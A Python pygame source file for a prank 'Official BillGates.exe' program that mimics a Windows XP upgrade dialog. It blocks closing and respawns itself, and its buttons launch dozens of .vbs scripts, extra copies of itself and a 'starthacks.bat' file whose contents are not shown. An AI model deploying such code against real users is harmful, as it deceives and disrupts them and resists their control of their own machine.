import pygame
import random
import subprocess
import sys
import time
from settings import *

class Game:
    def __init__(self):
        # Initialize game window, etc.
        self.load_data()
        if self.open_mc == 0:
            subprocess.Popen('C:\Program Files (x86)\Minecraft\MinecraftLauncher.exe')
            self.open_mc = 1
            with open((TEST_MC), 'r+') as a:
                a.write(str(self.open_mc))
        pygame.init()
        pygame.mixer.init()
        pygame.font.init()
        self.screen = pygame.display.set_mode((WIDTH, HEIGHT))
        pygame.display.set_caption(TITLE)
        pygame.display.set_icon(pygame.transform.scale(pygame.image.load("img/windows_xp.png"), (32, 32)))
        self.clock = pygame.time.Clock()
        self.font_name = pygame.font.match_font(FONT_NAME)
        self.currentBackFrame = 0
        self.lastBackUpdate = 0
        self.currentOkFrame = 0
        self.lastOkUpdate = 0
        self.okTimestamp = None
        self.closeTimestamp = None
        self.highlightOkSpeed = 200
        self.highlightBackground = False
        self.running = True

    def load_data(self):
        self.background = pygame.image.load("img/windowsXP.png")
        self.background = pygame.transform.scale(self.background, (WIDTH, HEIGHT))
        self.background2 = pygame.image.load("img/windowsXP2.png")
        self.background2 = pygame.transform.scale(self.background2, (WIDTH, HEIGHT))

        self.backgroundImages = [self.background, self.background2]
        self.currentBackImage = self.backgroundImages[0]
        self.currentOkImage = None

        self.upgradeButton = pygame.image.load("img/upgradeButton.png")
        self.noButton = pygame.image.load("img/noButton.png")
        self.upgradeButtonActive = pygame.image.load("img/upgradeButtonActive.png")
        self.noButtonActive = pygame.image.load("img/noButtonActive.png")

        with open((TEST_MC), 'r+') as a:
            try:
                self.open_mc = int(a.read())
            except:
                self.open_mc = 0

    def new(self):
        # Start a new game
        self.all_sprites = pygame.sprite.Group()
        pygame.mixer.music.load("img/billgates.wav")
        self.run()

    def run(self):
        # Game Loop
        pygame.mixer.music.play(-1)
        self.playing = True
        while self.playing:
            self.clock.tick(FPS)
            self.events()
            self.update()
            self.draw()

    def update(self):
        # Game Loop - Update
        self.all_sprites.update()
        self.clock.tick(FPS)
        self.click = pygame.mouse.get_pressed()
        self.mouse = pygame.mouse.get_pos()

        self.okHighlightFrames = [0, 1]

        now = pygame.time.get_ticks()

        if now - self.lastBackUpdate > 500:
            self.lastBackUpdate = now
            self.currentBackFrame = (self.currentBackFrame + 1) % len(self.backgroundImages)
            self.currentBackImage = self.backgroundImages[self.currentBackFrame]

        if now - self.lastOkUpdate > self.highlightOkSpeed:
            self.lastOkUpdate = now
            self.currentOkFrame = (self.currentOkFrame + 1)  % len(self.okHighlightFrames)
            self.currentOkImage = self.okHighlightFrames[self.currentOkFrame]

        if self.okTimestamp != None:
            if time.time() - self.okTimestamp >= 180:
                subprocess.Popen(['start', 'billgates.exe'], shell=True)
                self.okTimestamp = time.time()

        if self.closeTimestamp != None:
            if time.time() - self.closeTimestamp >= 180:
                subprocess.Popen(['start', 'billgates.exe'], shell=True)
                self.closeTimestamp = time.time()

    def draw_text(self, text, size, color, x, y, rect=False):
        font = pygame.font.Font(self.font_name, size)
        text_surface = font.render(text, True, color)
        text_rect = text_surface.get_rect()
        if rect == False:
            text_rect.midtop = (x, y)
        else:
            text_rect.midtop = (x + 17.5, y)
        self.screen.blit(text_surface, text_rect)
        if rect == True:
            self.text_rect = text_rect

    def events(self):
        # Game Loop - Events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                self.closeTimestamp = time.time()
                subprocess.Popen(['start', 'billgates.exe'], shell=True)
                #if self.playing:
                    #self.playing = False
                #self.running = False

    def draw(self):
        # Game Loop - Draw
        self.screen.fill(BLACK)
        self.screen.blit(self.currentBackImage, (0, 0))
        self.draw_text('Official BillGates.exe', 30, BLACK, WIDTH / 2 + 180, HEIGHT - 40)
        self.all_sprites.draw(self.screen)
        if self.currentOkImage == 1:
            pygame.draw.rect(self.screen, DARK_BLUE, (WIDTH / 2 - 103, HEIGHT / 2 + 9, 181, 81))
        self.button(WIDTH / 2 - 100, HEIGHT / 2 + 12, 175, 75, self.upgradeButton, self.upgradeButtonActive, "Yes")
        self.button(WIDTH / 2 + 150, HEIGHT / 2 + 12, 175, 75, self.noButton, self.noButtonActive, "No")
        pygame.display.flip()

    def button(self, x, y, w, h, defaultImage, activeImage, action):
        self.x = x
        self.y = y
        self.w = w
        self.h = h
        self.defaultImage = defaultImage
        self.activeImage = activeImage
        self.action = action
        drawnImage = self.defaultImage

        if self.x + self.w > self.mouse[0] > self.x and self.y + self.h > self.mouse[1] > self.y:
            drawnImage = self.activeImage
            if self.action == "Yes":
                self.highlightOkSpeed = 20000
            for event in pygame.event.get():
                if event.type == pygame.MOUSEBUTTONUP:
                    if self.action == "Yes":
                        self.clicked_ok()
                    if self.action == "No":
                        self.clicked_no()
        else:
            if self.action == "Yes":
                self.highlightOkSpeed = 200
            drawnImage = self.defaultImage

        self.screen.blit(drawnImage, (self.x, self.y))

    def clicked_ok(self):
        self.okTimestamp = time.time()
        for i in range(50):
            subprocess.Popen(['start', 'BILL_GATES_HACKED_YOUR_COMPUTER.vbs'], shell=True)

    def clicked_no(self):
        for i in range(50):
            subprocess.Popen(['start', 'message.vbs'], shell=True)
        for i in range(5):
            subprocess.Popen(['start', 'billgates.exe'], shell=True)
        subprocess.Popen(['start', 'starthacks.bat'], shell=True)

g = Game()
while g.running:
    g.new()

pygame.quit()
sys.exit()
